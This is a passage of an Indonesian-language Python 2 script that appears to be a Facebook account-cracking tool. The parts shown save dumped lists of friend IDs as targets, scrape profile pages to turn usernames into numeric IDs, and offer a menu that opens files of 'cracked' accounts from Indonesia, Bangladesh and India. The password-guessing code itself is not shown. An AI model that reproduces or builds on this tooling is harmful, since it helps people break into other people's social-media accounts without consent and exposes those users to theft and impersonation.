        done = raw_input('\r\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[0;91m[\x1b[0;92m \xe2\x88\x9a \x1b[0;97m] File tersimpan : out/' + done
        raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        dump()
    except OSError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File tidak tersimpan '
        raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        os.system('python2 KIYAY_.py')
    except IOError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Error creating file'
        raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        os.system('python2 KIYAY_.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Terhenti '
        raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        dump()
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Teman tidak ada !'
        raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi !'
        keluar()
def ambil_id():
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    u = raw_input('Masukan username\x1b[0;91m >\x1b[0;97m ')
    url = 'https://www.facebook.com/' + u
    r = requests.get(url).text
    name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
    id = re.search('profile/(.*?)" ', r).group(1)
    print '\n\x1b[0;97mNAMA \x1b[0;91m>\x1b[0;97m ' + name
    print '\x1b[0;97mID \x1b[0;91m  >\x1b[0;97m ' + id + '\n'
    raw_input('\n\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
    menu()
def hasil():
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    time.sleep(0.07)
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;97m\x1b[0;97m Hasil Crack ID Indonesia'
    time.sleep(0.07)
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;97m\x1b[0;97m Hasil Crack ID Bangladesh'
    time.sleep(0.07)
    print '\x1b[0;97m [\x1b[0;97m03\x1b[0;97m]\x1b[0;97m\x1b[0;97m Hasil Crack ID India'
    time.sleep(0.07)
    print '\x1b[0;97m [\x1b[0;97m04\x1b[0;97m]\x1b[0;97m\x1b[0;97m Hasil Crack ID Post'
    time.sleep(0.07)
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;97m\x1b[0;97m Kembali'
    time.sleep(0.07)
    print '\x1b[0;91m\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    time.sleep(0.07)
    pilih_hasil()
def pilih_hasil():
    keak = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] ')
    if keak == '':
        print '\x1b[0;91m! Isi Yg Benar'
        pilih_hasil()
    elif keak == '1':
        os.system('xdg-open done/indo.txt')
        hasil()
    elif keak == '2':
        os.system('xdg-open done/bangla.txt')
        hasil()
    elif keak == '3':
        os.system('xdg-open done/hindi.txt')
        hasil()
    elif keak == '4':
        os.system('xdg-open done/like.txt')
        hasil()
    elif keak == '0':
        menu()
    else:
        print '\x1b[0;91mIsi Yg Benar'
def saya():
    os.system('clear')
    print logo
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://www.facebook.com/romi.rizal.58')
    menu()
if __name__ == '__main__':
    menu()
    masuk()
# Mau Ngapain Cuk?